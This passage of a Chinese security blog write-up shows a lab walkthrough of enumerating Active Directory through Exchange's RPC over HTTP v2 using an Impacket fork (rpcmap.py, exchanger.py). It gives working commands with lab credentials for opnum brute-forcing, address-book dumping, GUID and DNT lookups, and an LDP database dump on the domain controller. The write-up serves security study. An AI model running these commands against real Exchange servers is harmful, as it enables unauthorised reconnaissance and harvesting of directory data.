<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nocert-path = &quot;/rpc/rpcproxy.dll&quot;</span><br><span class="line">withcert-path = &quot;/rpcwithcert/rpcproxy.dll&quot;</span><br><span class="line">abs-path = nocert-path / withcert-path</span><br></pre></td></tr></table></figure>
<p>而后面对于 query 中对主机名的描述如下</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731145136995.png" alt="image-20200731145136995"></p>
<p>而实际使用的是 autodiscover 中出现的那个在 <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxdscli/47b57da7-b4f9-4125-9e1e-04b468a2f81a" target="_blank" rel="noopener">Server</a> 元素中的值，即邮件服务器的 <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxdscli/c003f814-8b23-451e-a7f6-42079dd1a945#gt_1769aec9-237e-44ed-9014-1abb3ec6de6e" target="_blank" rel="noopener">FQDN（fully qualified domain name）</a></p>
<p>使用 nmap 脚本http-ntlm-info 枚举启用了 NTLM 身份验证的来自远程 HTTP 服务的信息，获取目标NetBIOS名称</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731111637703.png" alt="image-20200731111637703"></p>
<p>获取工具，这个是 ptswarm 版本的 Impacket </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ptswarm/impacket</span><br><span class="line">mv impacket/impacket impacket/examples</span><br><span class="line">python3 -m pip install -r impacket/requirements.txt</span><br></pre></td></tr></table></figure>
<p>使用 rpcmap.py 工具连接 ncacn_http</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/rpcmap.py -debug -auth-transport &apos;J0K3R/tester:Qwer1234&apos; &apos;ncacn_http:[6001,RpcProxy=WIN-QT7IQOG92O7.j0k3r.top:443]&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731121921479.png" alt="image-20200731121921479"></p>
<p>使用 wireshark 抓取通信流量，此时最好将 443 改为 80，不然抓的是经 TLS 加密的流量</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731122042356.png" alt="image-20200731122042356"></p>
<p>Exchange 2003/2007/2010 通过 rpcproxy.dll 获取连接，而 Exchange 2013/2016/2019 还有一个 RpcProxyShim.dll，RpcProxyShim.dll 会 hook RpcProxy.dll 回调并处理 Exchange GUID 身份。还支持NetBIOS名称，以实现向后兼容。<br>RpcProxyShim.dll允 许跳过 RPC 级别的身份验证，并且可以将流量直接转发到 Exchange 进程以获取更快的连接。</p>
<p>更多详情可以参阅：<a href="https://github.com/ptswarm/impacket/blob/master/impacket/dcerpc/v5/rpch.py#L476" target="_blank" rel="noopener">https://github.com/ptswarm/impacket/blob/master/impacket/dcerpc/v5/rpch.py#L476</a></p>
<h3 id="扫描-RPC-over-HTTPv2-服务"><a href="#扫描-RPC-over-HTTPv2-服务" class="headerlink" title="扫描 RPC over HTTPv2 服务"></a>扫描 RPC over HTTPv2 服务</h3><p>用 rpcmap.py 工具扫描 MSRPC 接口，通过 -brute-opnums 选项依次调用每个 UUID（用于标记 RPC 对象）分配的操作号的前 N 个，并输出结果，获取 Exchange 2019 可以访问的服务</p>
<blockquote>
<p>opnums 一个操作号或数字标识符，用于标识特定的远程过程调用（RPC）方法或接口中的方法。</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/rpcmap.py -debug -auth-transport <span class="string">'J0K3R/tester:Qwer1234'</span> -auth-rpc <span class="string">'J0K3R/tester:Qwer1234'</span> -auth-level 6 -brute-opnums <span class="string">'ncacn_http:[6001,RpcProxy=WIN-QT7IQOG92O7.j0k3r.top:443]'</span></span><br><span class="line">Impacket - Exchanger.py Fork</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /Users/xc/Downloads/ms exchange attack/impacket/examples/impacket</span><br><span class="line">[+] StringBinding has been changed to ncacn_http:WIN-QT7IQOG92O7[6001,RpcProxy=WIN-QT7IQOG92O7.j0k3r.top:443]</span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 00000131-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM)</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 00000134-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 00000143-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-OXABREF]: Address Book Name Service Provider Interface (NSPI) Referral Protocol</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 1544F5E0-613C-11D1-93DF-00C04FD7BD09 v1.0</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnums 2-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM)</span><br><span class="line">Provider: ole32.dll</span><br><span class="line">UUID: 18F70770-8E64-11CF-9AF1-0020AF6E72F4 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-OXCRPC]: Wire Format Protocol</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 5261574A-4572-206E-B268-6B199213B4E4 v0.1</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnums 1-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: 5DF3C257-334B-4E96-9EFB-A0619255BE09 v1.0</span><br><span class="line">Opnum 0: rpc_s_access_denied</span><br><span class="line">Opnum 1: rpc_s_access_denied</span><br><span class="line">Opnum 2: rpc_s_access_denied</span><br><span class="line">Opnum 3: rpc_s_access_denied</span><br><span class="line">Opnum 4: rpc_s_access_denied</span><br><span class="line">Opnum 5: rpc_s_access_denied</span><br><span class="line">Opnum 6: rpc_s_access_denied</span><br><span class="line">Opnum 7: [Errno 54] Connection reset by peer</span><br><span class="line">Opnums 8-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-OXCRPC]: Wire Format Protocol</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: A4F1DB00-CA47-1067-B31F-00DD010662DA v0.81</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: rpc_x_bad_stub_data</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: rpc_x_bad_stub_data</span><br><span class="line">Opnum 6: success</span><br><span class="line">Opnum 7: rpc_x_bad_stub_data</span><br><span class="line">Opnum 8: rpc_x_bad_stub_data</span><br><span class="line">Opnum 9: rpc_x_bad_stub_data</span><br><span class="line">Opnum 10: rpc_x_bad_stub_data</span><br><span class="line">Opnum 11: rpc_x_bad_stub_data</span><br><span class="line">Opnum 12: rpc_x_bad_stub_data</span><br><span class="line">Opnum 13: rpc_x_bad_stub_data</span><br><span class="line">Opnum 14: rpc_x_bad_stub_data</span><br><span class="line">Opnums 15-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line">Opnum 0: success</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: success</span><br><span class="line">Opnum 3: success</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnums 5-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: N/A</span><br><span class="line">UUID: BA3FA067-8D56-4B56-BA1F-9CBAE8DB3478 v1.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-NSPI]: Name Service Provider Interface (NSPI) Protocol</span><br><span class="line">Provider: ntdsai.dll</span><br><span class="line">UUID: F5CC5A18-4264-101A-8C59-08002B2F8426 v56.0</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: rpc_x_bad_stub_data</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: rpc_x_bad_stub_data</span><br><span class="line">Opnum 6: rpc_x_bad_stub_data</span><br><span class="line">Opnum 7: rpc_x_bad_stub_data</span><br><span class="line">Opnum 8: rpc_x_bad_stub_data</span><br><span class="line">Opnum 9: rpc_x_bad_stub_data</span><br><span class="line">Opnum 10: rpc_x_bad_stub_data</span><br><span class="line">Opnum 11: rpc_x_bad_stub_data</span><br><span class="line">Opnum 12: rpc_x_bad_stub_data</span><br><span class="line">Opnum 13: rpc_x_bad_stub_data</span><br><span class="line">Opnum 14: rpc_x_bad_stub_data</span><br><span class="line">Opnum 15: rpc_x_bad_stub_data</span><br><span class="line">Opnum 16: rpc_x_bad_stub_data</span><br><span class="line">Opnum 17: rpc_x_bad_stub_data</span><br><span class="line">Opnum 18: rpc_x_bad_stub_data</span><br><span class="line">Opnum 19: rpc_x_bad_stub_data</span><br><span class="line">Opnum 20: rpc_x_bad_stub_data</span><br><span class="line">Opnums 21-64: nca_s_op_rng_error (opnum not found)</span><br></pre></td></tr></table></figure>
<p>该工具的原理其实就是利用 RPC 的 rpc_mgmt_inq_if_ids （有关文档：<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqifids?redirectedfrom=MSDN" target="_blank" rel="noopener">RpcMgmtInqIfIds function</a>，<a href="https://pubs.opengroup.org/onlinepubs/9629399/rpc_mgmt_inq_if_ids.htm" target="_blank" rel="noopener">rpc_mgmt_inq_if_ids</a>）方法返回服务器提供的接口的接口标识符的向量，这个向量列出了服务器在 RPC 运行时系统中注册的接口，然后针对接口遍历 64 个 Opnum 对应的操作进行调用，根据返回的数据判断操作结果，最终获取能够使用的接口和方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804153819726.png" alt="image-20200804153819726"></p>
<p>根据以上输出，所有 Opnum 执行结果都是 access_denied 的协议则不可用，而 rpcmap.py 使用的是 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/3165f378-ede3-48a8-b871-be1183e1b7fb" target="_blank" rel="noopener">MS-RPCE</a> 协议，剩余通过 Exchange 的 RPC over HTTP v2 可用的协议如下：</p>
<table>
<thead>
<tr>
<th><strong>协议</strong></th>
<th><strong>UUID</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a" target="_blank" rel="noopener">MS‑OXCRPC</a></td>
<td>A4F1DB00-CA47-1067-B31F-00DD010662DA v0.81</td>
<td>有线格式协议EMSMDB接口</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a" target="_blank" rel="noopener">MS‑OXCRPC</a></td>
<td>5261574A-4572-206E-B268-6B199213B4E4 v0.1</td>
<td>有线格式协议AsyncEMSMDB接口</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxabref/88c2b896-fe4f-4e28-8a87-e83a73d9c90e" target="_blank" rel="noopener">MS‑OXABREF</a></td>
<td>1544F5E0-613C-11D1-93DF-00C04FD7BD09 v1.0</td>
<td>通讯簿名称服务提供商接口（NSPI）推荐协议</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxnspi/63662a26-c8fc-4493-a41a-fbcbb7e43136" target="_blank" rel="noopener">MS‑OXNSPI</a></td>
<td>F5CC5A18-4264-101A-8C59-08002B2F8426 v56.0</td>
<td>Exchange服务器名称服务提供程序接口（NSPI）协议</td>
</tr>
</tbody>
</table>
<p><strong>MS‑OXNSPI 与 MS-NSPI 相似，且 UUID 一致</strong></p>
<p>MS-OXCRPC是 Ruler 用来向 Exchange 发送 MAPI 消息的协议，而 MS-OXABREF 和 MS-OXNSPI 是两个新的可用协议。</p>
<h3 id="分析-MS-OXABREF-与-MS-OXNSPI"><a href="#分析-MS-OXABREF-与-MS-OXNSPI" class="headerlink" title="分析 MS-OXABREF 与 MS-OXNSPI"></a>分析 MS-OXABREF 与 MS-OXNSPI</h3><p><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxnspi/63662a26-c8fc-4493-a41a-fbcbb7e43136" target="_blank" rel="noopener">MS-OXNSPI</a>：Exchange Server Name Service Provider Interface (NSPI) Protocol，Exchange 服务器名称服务提供程序接口（NSPI）协议</p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxabref/88c2b896-fe4f-4e28-8a87-e83a73d9c90e" target="_blank" rel="noopener">MS-OXABREF</a>：Address Book Name Service Provider Interface (NSPI) Referral Protocol，通讯簿名称服务提供程序接口（NSPI）Referral 协议</p>
<p>看下官方文档中的 NSPI 的 NspiDNToMId (Opnum 7) 方法描述</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731164454319.png" alt="image-20200731164454319"></p>
<p>将一组 DNs 映射到一组 Minimal Entry ID（用于唯一标识地址簿对象），这里的 DNs 是指 Legacy DNs，在前面的 Autodiscover 中有</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731165110808.png" alt="image-20200731165110808"></p>
<p>使用其 Legacy DN 请求用户的信息，通过 MS-OXNSPI 连接到 Exchange 并执行 NspiDNToMId 操作</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731170703232.png" alt="image-20200731170703232"></p>
<p>通过获取的临时标识符请求所有对象的属性</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731170826885.png" alt="image-20200731170826885"></p>
<h3 id="MIDs-和-Legacy-DNs-的格式"><a href="#MIDs-和-Legacy-DNs-的格式" class="headerlink" title="MIDs 和 Legacy DNs 的格式"></a>MIDs 和 Legacy DNs 的格式</h3><p>上文提到了 DNs，还有一个 <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxnspi/902ede0d-bb0a-46f0-bf68-03a6ed08d4e8" target="_blank" rel="noopener">Minimal Entry ID</a>，用来标识地址簿的，文档中没有公开算法，下面使用 MS-OXNSPI 的 NspiGetSpecialTable（Opnum 12）来获取地址簿，方法详情可参阅文档 <a href="https://interoperability.blob.core.windows.net/files/MS-OXNSPI/[MS-OXNSPI].pdf" target="_blank" rel="noopener">https://interoperability.blob.core.windows.net/files/MS-OXNSPI/%5bMS-OXNSPI%5d.pdf</a> 第 40 页</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731173944662.png" alt="image-20200731173944662"></p>
<p>其中 PidTagAddressBookContainerId 的值为地址簿的 Minimal Entry ID（根据文档 <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxoabk/4fe5bb0c-fbfe-41c2-a3e5-59fe5e683ee3" target="_blank" rel="noopener">PidTagAddressBookContainerId</a>），而且是从 -16 往下递减的</p>
<p>转为无符号整数来看就是从 0xfffffff0 开始递减</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(-16 &amp; 0xffffffff)</span><br><span class="line">&apos;0xfffffff0&apos;</span><br><span class="line">&gt;&gt;&gt; hex(-17 &amp; 0xffffffff)</span><br><span class="line">&apos;0xffffffef&apos;</span><br><span class="line">&gt;&gt;&gt; hex(-18 &amp; 0xffffffff)</span><br><span class="line">&apos;0xffffffee&apos;</span><br></pre></td></tr></table></figure>
<p>上图中形如 <code>/guid=D7D867F86D0E2746AD85547FB24BC918</code> 的 PidTagEntryId 表示一个新的 Legacy DN 格式，<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxoabk/06e45f59-e371-404f-8805-ea5e99ebb7ba" target="_blank" rel="noopener">2.2.3.2 PidTagEntryId</a>，用这个新格式可以请求 Active Directory 对象</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731180248671.png" alt="image-20200731180248671"></p>
<p>目前可以通过 GUID 或者 MID 来获取 Active Directory 对象信息，那如何获取所有 Active Directory 对象的 GUID 或者 MID 呢？</p>
<h3 id="MIDs（Minimal-Entry-ID）的其它格式"><a href="#MIDs（Minimal-Entry-ID）的其它格式" class="headerlink" title="MIDs（Minimal Entry ID）的其它格式"></a>MIDs（Minimal Entry ID）的其它格式</h3><p>Exchange 使用 LDAP 和 MS-NSPI 协议连接到 DC 以访问 Active Directory 数据库， 且 MS-NSPI 又是一种和 MS-OXNSPI 相似的 MSRPC 协议，方法基本相同，所以 MS-NSPI 是除了 LDAP 和 MS-DRSR（或 DcSync 和 DRSUAPI）之外第三个能访问 Active Directory 数据库的协议</p>
<p>通过 MS-NSPI 连接到域控制器</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731183850785.png" alt="image-20200731183850785"></p>
<p>获取地址簿列表</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200731195123286.png" alt="image-20200731195123286"></p>
<p>在上文中也提到了，PidTagAddressBookContainerId 表示的就是 MId（Minimal Entry ID），不同的是，域控制器上的一个 MId 表示一个 DNT 对象，Distinguished Name Tags (DNTs) 是域控制器 NTDS.dit 数据库内部对象的 4 字节整形索引</p>
<p>但是通过使用  NspiUpdateStat 方法可以将指定的地址簿 ContainerID（Exchange MID）转换为域控的 MID，即返回信息中的的 CurrentRec 字段值，详情可参阅文档 <a href="https://interoperability.blob.core.windows.net/files/MS-OXNSPI/[MS-OXNSPI].pdf" target="_blank" rel="noopener">https://interoperability.blob.core.windows.net/files/MS-OXNSPI/%5bMS-OXNSPI%5d.pdf</a> 第 42 页</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803113512545.png" alt="image-20200803113512545"></p>
<p>如下所示，不过这里的 MID 好像不太正常</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803114147207.png" alt="image-20200803114147207"></p>
<h3 id="使用-exchanger-py"><a href="#使用-exchanger-py" class="headerlink" title="使用 exchanger.py"></a>使用 exchanger.py</h3><p>工具位于 impacket/examples 目录下，主要通过 MS-NSPI 实现实现攻击，</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803121403405.png" alt="image-20200803121403405"></p>
<p><strong>列出地址簿获取所有地址列表</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/exchanger.py J0K3R/tester:<span class="string">'Qwer1234'</span>@j0k3r.top nspi  list-tables -count</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803123223296.png" alt="image-20200803123223296"></p>
<p>该功能其实就是利用 NSPI 的 NspiGetSpecialTable 方法，-debug 选项中能看到 MID</p>
<p><strong>获取指定地址簿的数据</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/exchanger.py J0K3R/tester:<span class="string">'Qwer1234'</span>@j0k3r.top nspi dump-tables -name 所有用户 -lookup-type EXTENDED</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803123334777.png" alt="image-20200803123334777"></p>
<p>该部分则是在 NspiGetSpecialTable 获取地址簿层次表的基础上查询指定地址簿的数据，通过 update_stat 函数，再利用 NSPI 的 NspiUpdateStat 方法根据 MID 更新在指定表中的位置</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804105258629.png" alt="image-20200804105258629"></p>
<p>然后利用 NspiQueryRows 方法返回关于表中一组行的信息</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804110037188.png" alt="image-20200804110037188"></p>
<p>最终将信息格式化输出</p>
<p><strong>已知 GUID 攻击</strong></p>
<p>通过 GUID/GUIDs 获取 Active Directory对象，比如获取 tester2 用户的所有信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/exchanger.py J0K3R/tester:<span class="string">'Qwer1234'</span>@j0k3r.top nspi guid-known -guid 4d4a3ddd-86a0-471c-b31e-c655342f1999 -lookup-type FULL</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803124715790.png" alt="image-20200803124715790"></p>
<p>该部分主要是通过 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nspi/7c059171-6427-4e9b-9c3b-69d0c51d87bb" target="_blank" rel="noopener">NspiResolveNamesW</a> 方法通过模糊名称解析 (ANR) 这种搜索算法来查询对象</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804111501455.png" alt="image-20200804111501455"></p>
<p>我们输入的 guid 将会被转为 /guid 的 legacyDN 形式，比如所有用户地址簿的Guid：82621831-97cf-4085-ac72-acdaf3e47488 转换后为 PidTagEntryId: /guid=31186282CF978540AC72ACDAF3E47488，在 NspiGetSpecialTable 中可以直接获取</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804112131514.png" alt="image-20200804112131514"></p>
<p>最后 print_row 输出对象信息</p>
<p><strong>专有名称标签查找（Distinguished Name Tags，DNTs）</strong></p>
<p>可以通过 DNT 查找指定范围内的所有 Active Directory 中的记录</p>
<p>我们可以在域控主机上通过 LDP 查看一下 DNT，运行输入 LDP.exe 打开程序，点击左上角连接，选择连接到本地，再进行绑定，可以使用当前管理账户</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803141239375.png" alt="image-20200803141239375"></p>
<p>确定绑定之后，进入浏览 —&gt; 修改，添加属性 dumpdatabase，值如果没有特殊要求的话可以写随便写个 name，没有值会抛出参数错误</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803141656014.png" alt="image-20200803141656014"></p>
<p>填好值，点击输入，然后运行，在 C:\Windows\NTDS 目录下会生成一个 ntds.dmp，可以使用 notepad 打开，其默认就包含了 DNT 等字段信息</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803141949998.png" alt="image-20200803141949998"></p>
<p>还能够看到 Administrator 等用户</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803142107350.png" alt="image-20200803142107350"></p>
<p>使用 exchanger.py 查看有关信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/exchanger.py J0K3R/tester:<span class="string">'Qwer1234'</span>@j0k3r.top nspi dnt-lookup -lookup-type EXTENDED -start-dnt 3802 -stop-dnt 3805</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200803142224816.png" alt="image-20200803142224816"></p>
<p>因为在域控制器中 DNT 代表 MId，这里输入指定的 DNT 范围，传入 NspiQueryRows 的参数为 lpETable，lpETable 表示一个 MId 列表，见 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nspi/d2b081c0-33be-4ebe-9926-bba4dbc4a596" target="_blank" rel="noopener">3.1.4.8 NspiQueryRows (Opnum 3)</a>  <img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/attack MS Exchange Web.assets/image-20200804114728429.png" alt="image-20200804114728429"></p>
<p>最后打印输出对象信息</p>
<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/" target="_blank" rel="noopener">https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/</a></p>
<p><a href="https://xpertstec.com/step-by-step-installation-of-exchange-server-2019/" target="_blank" rel="noopener">https://xpertstec.com/step-by-step-installation-of-exchange-server-2019/</a></p>
<p><a href="https://www.miensi.com/733.html" target="_blank" rel="noopener">https://www.miensi.com/733.html</a></p>
<p><a href="https://paper.seebug.org/775/" target="_blank" rel="noopener">https://paper.seebug.org/775/</a></p>
